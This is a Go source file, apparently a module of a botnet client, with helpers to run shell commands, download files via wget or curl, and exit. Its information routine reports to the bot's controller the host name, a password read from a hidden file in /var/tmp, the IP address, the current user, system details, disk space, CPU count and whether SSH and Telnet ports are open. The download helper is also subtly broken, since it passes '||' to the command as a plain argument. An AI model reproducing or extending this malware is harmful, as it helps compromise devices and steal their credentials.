package lib

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
)

func KILL() { syscall.Exit(0) }

func convInt(str string) int {
	conv, _ := strconv.Atoi(fmt.Sprint(str))
	return conv
}

func getHostname() string {
	hostName, err := os.Hostname()
	if err != nil {
		return "Fail to get hostname!!!"
	}
	return hostName
}

func execComd(comd string, args ...string) string {
	fmtComd, err := exec.Command(comd, args...).Output()
	if err != nil {
		return "Fail to execute command!!!"
	}
	return string(fmtComd)
}

func download(savef, web string) string {
	return execComd("wget", "-O", savef, web, "||", "curl", "-o", savef, web)
}

func getDiskSpace() string {
	wd, err := os.Getwd()
	if err != nil {
		return "Fail to get free disk space!!!"
	}
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return fmt.Sprint(stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024)
}

func fileName(readInfo bool) string {
	if readInfo {
		infoFile := strings.Trim(os.Args[0], "./")
		return "." + infoFile
	}
	return "." + BotGroup + BotID
}

func (b Bot) information() {
	infoPort := func(port string) string {
		b.timeout = 8 * time.Millisecond
		if b.checkPort("127.0.0.1", port) != "" {
			return port + " IS OPEN"
		}
		return port + " IS CLOSE"
	}
	if _, setKey := SetupCaller(); setKey {
		b.Report("Host Name: " + getHostname())
		b.Report("Password: " + execComd("head", "-1", "/var/tmp/"+fileName(true)))
		b.Report("IP Address: " + execComd("tail", "-1", "/var/tmp/"+fileName(true)))
		b.Report("Current Permission: " + execComd("whoami"))
		b.Report("System: " + execComd("uname", "-a"))
		b.Report("Free Disk Space (GB): " + getDiskSpace())
		b.Report("Number of Cores: " + strconv.Itoa(b.CPU))
		b.Report("Number of Threads: " + strconv.Itoa(b.CPU*2))
		b.Report("Default SSH: " + infoPort("22"))
		b.Report("Default Telnet: " + infoPort("23"))
		b.Report("IoT Telnet: " + infoPort("2323"))
	}
}
